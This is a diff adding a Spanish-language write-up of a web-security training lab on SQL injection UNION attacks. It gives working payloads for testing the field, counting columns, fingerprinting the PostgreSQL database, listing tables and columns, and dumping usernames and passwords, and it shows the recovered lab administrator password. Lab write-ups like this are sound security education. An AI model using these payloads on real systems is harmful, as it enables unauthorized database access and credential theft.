@@ -12,3 +12,97 @@ citation: 'SQL injection UNION attack, retrieving data from other tables'
 ---
 
 ![logo]({{site.url}}/images/SQLi/sqli-5/logo.png)
+
+## Descripción del laboratorio
+
+![Descripción]({{site.url}}/images/SQLi/sqli-5/descripcion.png)
+
+## Objetivo del laboratorio
+
+Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como usuario `administrator`.
+
+## Determinamos que el campo si es vulnerable
+
+```javascript
+' or 1=1--
+```
+
+![Vulnerable]({{site.url}}/images/SQLi/sqli-5/vulnerable.png)
+
+## Determinar el numero de columnas retornadas por la consulta
+
+Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.
+
+```javascript
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+![Order by]({{site.url}}/images/SQLi/sqli-5/order by.png)
+
+## Miramos que columna es de tipo 'String'
+
+Inyectamos en cada una de ellas mirando cual podemos inyectar 'String'
+
+```javascript
+' UNION SELECT 'A', NULL--
+' UNION SELECT NULL, 'A'--
+' UNION SELECT 'A', 'A'--
+```
+
+En este caso ambas columnas reciben tipo string
+
+![String]({{site.url}}/images/SQLi/sqli-5/tipo string.png)
+
+## Obtener que tipo de Base de dato es
+
+Es una BD Posgres SQL
+
+```javascript
+' UNION SELECT version(), null--
+```
+
+![Base de datos]({{site.url}}/images/SQLi/sqli-5/BD.png)
+
+## Obtener el nombre de las tablas
+
+Ya que conocemos el tipo de BD, debemos listar el nombre de las tablas.
+
+```javascript
+' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public'--
+```
+
+![Tablas]({{site.url}}/images/SQLi/sqli-5/tablas.png)
+
+## Listamos las columnas
+
+```javascript
+' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--
+```
+
+![Columnas de la tabla]({{site.url}}/images/SQLi/sqli-5/columbas de la tabla.png)
+
+## Listar username y password
+Ya que conocemos las columnas de la tabla, debemos listarla
+
+```javascript
+' UNION SELECT username, password FROM users--
+```
+
+![Usuarios Passwords]({{site.url}}/images/SQLi/sqli-5/listado usuario y password.png)
+
+## Procedemos a hacer el login
+
+```
+administrator
+4hve3wc018z7mnlll440
+```
+
+![login]({{site.url}}/images/SQLi/sqli-5/login.png)
+
+## Solucionado
+
+Solventado el laboratorio
+
+![Aprobado]({{site.url}}/images/SQLi/sqli-5/aprobado.png)
